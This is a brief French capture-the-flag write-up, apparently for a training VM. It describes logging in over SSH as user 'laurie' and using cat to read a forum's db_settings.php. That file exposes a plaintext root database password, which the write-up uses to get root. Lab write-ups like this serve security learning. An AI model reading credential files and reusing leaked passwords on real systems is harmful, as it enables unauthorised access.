# Writeup 5

connecter en ssh avec laurie avec le path on retouve les info de creation de la db puis on peut se co en root
a la DB

```bash
~$ cat /var/www/forum/config/db_settings.php
<?php
$db_settings['host'] = 'localhost';
$db_settings['user'] = 'root';
$db_settings['password'] = 'Fg-\'kKXBj87E:aJ$';
$db_settings['database'] = 'forum_db';
$db_settings['settings_table'] = 'mlf2_settings';
$db_settings['forum_table'] = 'mlf2_entries';
$db_settings['category_table'] = 'mlf2_categories';
$db_settings['userdata_table'] = 'mlf2_userdata';
$db_settings['smilies_table'] = 'mlf2_smilies';
$db_settings['pages_table'] = 'mlf2_pages';
$db_settings['banlists_table'] = 'mlf2_banlists';
$db_settings['useronline_table'] = 'mlf2_useronline';
$db_settings['login_control_table'] = 'mlf2_logincontrol';
$db_settings['entry_cache_table'] = 'mlf2_entries_cache';
$db_settings['userdata_cache_table'] = 'mlf2_userdata_cache';
?>
```
Nous voila root 
